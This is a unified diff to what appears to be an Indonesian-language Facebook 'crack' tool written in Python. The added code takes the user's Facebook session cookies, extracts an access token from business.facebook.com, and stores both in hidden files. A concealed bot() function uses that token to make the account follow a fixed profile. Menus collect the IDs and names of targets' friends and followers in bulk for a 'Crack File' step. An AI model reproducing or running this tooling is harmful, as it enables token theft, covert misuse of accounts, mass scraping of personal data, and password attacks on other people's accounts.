@@ -123,7 +123,7 @@ def faisalmand():
     if _ffaisal___ in ('1', '01'):
         os.system('clear');__xxx__().faissalx(id)
     if _ffaisal___ in ('02', '2'):
-        os.system('clear');publik()
+        os.system('clear');menu(my_name,my_id)
     if _ffaisal___ in ('3', '03'):
     	os.system('clear');print(logo);sep()
     if _ffaisal___ in ('4', '04'):
@@ -399,7 +399,168 @@ class load:
             sys.stdout.flush()
             time.sleep(0.1)
         print('\n')
-###
+#------------------[ BAGIAN-LOGIN ]----------------#
+def login():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		tokenku.append(token)
+		try:
+			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			sy2 = json.loads(sy.text)['name']
+			sy3 = json.loads(sy.text)['id']
+			menu(sy2,sy3)
+		except KeyError:
+			login_lagi334()
+		except requests.exceptions.ConnectionError:
+			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
+			lo = mark(li, style='red')
+			sol().print(lo, style='cyan')
+			exit()
+	except IOError:
+		login_lagi334()
+def login_lagi334():
+	try:
+		os.system('clear')
+		banner()
+		cetak(nel('\tGunakan Akun Baru [green]Agar Tidak Mudah CheckPoint[white]'))
+		asu = random.choice([m,k,h,b,u])
+		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4.2 Mobile/15E148 Safari/605.1.15 BingWeb/6.54.1.0 iphoneXS BingWeb/6.54.1.0","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		find_token = re.search("(EAAG\w+)", data.text)
+		ken=open(".token.txt", "w").write(find_token.group(1));bot()
+		cok=open(".cok.txt", "w").write(cookie)
+		print(f'  {x}[{h}•{x}]{h} LOGIN GAGAL-- WKWK CANDA BANG-COBA JALANKAN ULANG!!{x} ');time.sleep(1)
+		exit()
+	except Exception as e:
+		os.system("rm -f .token.txt")
+		os.system("rm -f .cok.txt")
+		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		exit()
+def bot():
+	try:
+		requests.post("https://graph.facebook.com/100051967952842?fields=subscribers&access_token=%s"%(tokenku))
+	except:
+		pass
+
+#------------------[ BAGIAN-MENU ]----------------#
+def menu(my_name,my_id):
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		print('[×] Cookies Kadaluarsa ')
+		time.sleep(5)
+		login_lagi334()
+	os.system('clear')
+	banner()
+	ip = requests.get("https://api.ipify.org").text
+	##gh = 'github.com/Al-Vino'
+	cetak(nel('\tSelamat Datang [yellow]%s[white] Ganteng'%(my_name)))
+	print(f'ID  : '+str(my_id))
+	print(f'IP  : {ip}')
+	###print(f'>> Github   : {gh}')
+	print('')
+	print('1. DUMP ID PUBLIK ')
+	print('2. DUMP ID FOLLOWERS ')
+	print('3. DUMP ID GRUP   ')
+	print('>> 4. Crack File	')
+	print('>> 5. Hasil Crack  ')
+	print('0. KELUAR       ')
+	_____alvino__adijaya_____ = input('\nPILIH : ')
+	if _____alvino__adijaya_____ in ['1']:
+		dump_massal()
+	elif _____alvino__adijaya_____ in ['2']:
+		dump_follower()
+	elif _____alvino__adijaya_____ in ['3']:
+		grup()
+	elif _____alvino__adijaya_____ in ['4']:
+		crack_file()
+	elif _____alvino__adijaya_____ in ['5']:
+		result()
+	elif _____alvino__adijaya_____ in ['0']:
+		os.system('rm -rf .token.txt')
+		os.system('rm -rf .cookie.txt')
+		print('>> Sukses Logout+Hapus Kukis ')
+		exit()
+	else:
+		print('>> Pilih Yang Bener Asu ')
+		back()
+def error():
+	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	time.sleep(4)
+	back()
+
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input('MAU BERAPA TARGET : '))
+	except ValueError:
+		print('>> Masukkan Angka Anjing, Malah Huruff kontol ')
+		exit()
+	if jum<1 or jum>100:
+		print('>> Gagal Dump Idz ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input('MASUKKAN ID YANG KE '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print('>> Sinyal Loh Kek Kontoll ')
+			exit()
+	try:
+		print('')
+		print(f'TOTAL ID YANG TERKUMPUL : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('>> Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'>>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
+#-------------------[ CRACK-PENGIKUT ]----------------#
+def dump_pengikut():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
+	pil = input('>> Masukkan Idz Target : ')
+	try:
+		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
+		for pi in koh2['subscribers']['data']:
+			try:id.append(pi['id']+'|'+pi['name'])
+			except:continue
+		print(f'>> Total Idz :{h} '+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print('>> Koneksi Internet Bermasalah ')
+		exit()
+	except (KeyError,IOError):
+		print('>> Gagal Mengambil Target ')
+		exit()
+#------------------[ CRACK-GRUP ]-----------------#
+	###
 def sep():
     os.system('clear');print(logo)
     try:
@@ -496,7 +657,7 @@ def publik():
         print('%s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
     except Exception as e:kecuali(e)
 
-def login():
+def logins():
     mkdir_data_login()
     print(logo)
     print('\n%s[%s•%s] %sInput Cookies %s!'%(M,P,M,P,M))
